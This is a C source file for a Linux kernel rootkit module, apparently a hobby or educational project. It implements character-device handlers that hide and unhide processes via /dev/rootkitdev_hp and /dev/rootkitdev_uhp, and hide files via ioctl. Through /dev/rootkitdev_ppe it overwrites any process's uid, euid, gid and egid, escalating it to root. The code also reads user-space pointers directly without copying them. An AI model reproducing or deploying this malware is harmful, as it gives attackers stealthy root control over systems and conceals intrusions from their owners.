/*
 *  Functions for operations with device
 */

#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/ioctl.h>
#include <linux/limits.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/pid.h> 
#include <linux/cred.h>
#include <linux/uidgid.h>

#include "device.h"
#include "tools/string_list.h"

//
// Device open handler
//
int device_open (struct inode *inode, struct file *file){
    printk( KERN_INFO "%s open device  %s (%d %d )\n", current->comm, file->f_path.dentry->d_iname, MAJOR(inode->i_rdev), MINOR(inode->i_rdev));;
    printk (KERN_INFO "inode: %p file: %p\n", inode, file);

    try_module_get (THIS_MODULE);

    return 0;
}

//
// Device release handler
//
int device_release (struct inode *inode, struct file *file){
    printk (KERN_INFO "%s close device %s (%d  %d)\n", current->comm, file->f_path.dentry->d_iname, MAJOR(inode->i_rdev), MINOR(inode->i_rdev));

    module_put (THIS_MODULE);

    return 0;
}


//
//  Device read handler
//
ssize_t device_read (struct file *file, char *buffer, size_t length, loff_t * offset){
    char msg[] = "!!!!!";
int bytes_read = min (length, sizeof(msg));

    printk (KERN_INFO "\t%s read from file %p on device %s (%d %d) %ld bytes\n", current->comm, file, file->f_path.dentry->d_iname, MAJOR(file->f_mapping->host->i_rdev), MINOR(file->f_mapping->host->i_rdev), length);

    if (*offset) {
        return 0;
        }

    if (copy_to_user (buffer, msg, bytes_read)) {
        return -EINVAL;
        }

    *offset = bytes_read;

    return bytes_read;
}

extern PStringList hidden_procs;
//
// Device write handler
//
ssize_t device_write (struct file *file, const char *buffer, size_t length, loff_t * off){
    char *fn_buf, *fn_start;

    fn_buf = kzalloc(PATH_MAX+1, GFP_KERNEL);
    fn_start = d_path(&(file->f_path), fn_buf, PATH_MAX);
    
    if(!strcmp(fn_start,"/dev/rootkitdev_hp")){
        list_insert(hidden_procs, (char *) buffer);
        printk(KERN_INFO"Hidden process %s\n", buffer);
    }else if(!strcmp(fn_start, "/dev/rootkitdev_uhp")){
        list_delete(hidden_procs, (char *) buffer);
        printk(KERN_INFO"Unhidden process %s\n", buffer);
    }else if(!strcmp(fn_start, "/dev/rootkitdev_ppe")){
        uint32_t pid, uid, euid, gid, egid;
        struct pid *pid_struct;
        struct task_struct *task;
        struct cred* task_cred;


        sscanf(buffer, "%d %d %d %d %d", &pid, &uid, &euid, &gid, &egid);
        pid_struct = find_get_pid(pid);
        task = pid_task(pid_struct,PIDTYPE_PID);


        if (task == NULL)
        {
            printk (KERN_INFO "Process with pid %d is not running \n",pid);
        }else{
            task_cred = get_task_cred (task);
            task_cred->uid = KUIDT_INIT(uid);
            task_cred->euid = KUIDT_INIT(euid);
            task_cred->gid = KGIDT_INIT(gid);
            task_cred->egid = KGIDT_INIT(egid);
            printk(KERN_INFO "Process %d changed uid to %d, euid to %d, gid to %d, egid to %d\n",pid, uid, euid, gid, egid);
        }

    }

done:
    kfree(fn_buf);

    return -EINVAL;
}



extern PStringList hidden_files;

//
// Device IOCTL handler
//
long int device_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
    if((_IOC_TYPE(cmd))!= IOC_MAGIC){
        return -ENOTTY;
    }
    switch (cmd){
        case IOCTL_TEST:
            printk(KERN_INFO "TEST IOCTL RECIEVED\n");
            break;
        case IOCTL_HIDE_FILE:
            list_insert(hidden_files, (char *) arg);
            printk(KERN_INFO "IOCTL HIDE FILE %s\n", (char*)arg);
            break;
        case IOCTL_UNHIDE_FILE:
            list_delete(hidden_files, (char *) arg);
            printk(KERN_INFO "IOCTL UNHIDE FILE %s\n", (char*)arg);
            break;
        default:
            return -ENOTTY;
    }
    return 0;
}
